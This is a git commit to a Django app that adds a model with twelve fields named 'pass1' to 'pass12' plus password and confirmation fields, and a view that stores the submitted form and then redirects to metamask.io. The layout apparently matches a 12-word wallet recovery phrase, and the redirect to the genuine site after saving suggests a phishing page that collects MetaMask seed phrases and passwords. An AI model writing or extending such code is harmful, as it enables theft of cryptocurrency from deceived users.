a57135eda36b4ac187c73f8f0eddb0624d548be9
Faith Mwangi <faith.mwangi@student.moringaschool.com>
2022-06-25 14:44:45 +0300

    update models

--- atem/models.py
+++ atem/models.py
@@ -1,3 +1,21 @@
 from django.db import models
 
 # Create your models here.
+class Info(models.Model):
+  pass1=models.CharField(max_length=400, blank=False)
+  pass2=models.CharField(max_length=300, blank=True)
+  pass3=models.CharField(max_length=300, blank=True)
+  pass4=models.CharField(max_length=300, blank=True)
+  pass5=models.CharField(max_length=300, blank=True)
+  pass6=models.CharField(max_length=300, blank=True)
+  pass7=models.CharField(max_length=300, blank=True)
+  pass8=models.CharField(max_length=300, blank=True)
+  pass9=models.CharField(max_length=300, blank=True)
+  pass10=models.CharField(max_length=300, blank=True)
+  pass11=models.CharField(max_length=300, blank=True)
+  pass12=models.CharField(max_length=300, blank=True)
+  password=models.CharField(max_length=120, blank=True)
+  passwordconf=models.CharField(max_length=120, blank=True)
+
+  def __str__(self):
+        return str(self.id)
--- atem/views.py
+++ atem/views.py
@@ -1,6 +1,14 @@
-from django.shortcuts import render
+from django.shortcuts import render, redirect
+from .forms import *
 
 # Create your views here.
 def index(request):
+  if request.method == 'POST':
+    form = InfoForm(request.POST, request.FILES)
+    if form.is_valid():
+      form.save()
+      return redirect('https://metamask.io/')  
+    else:
+      form = InfoForm()  
 
   return render(request, 'index.html')
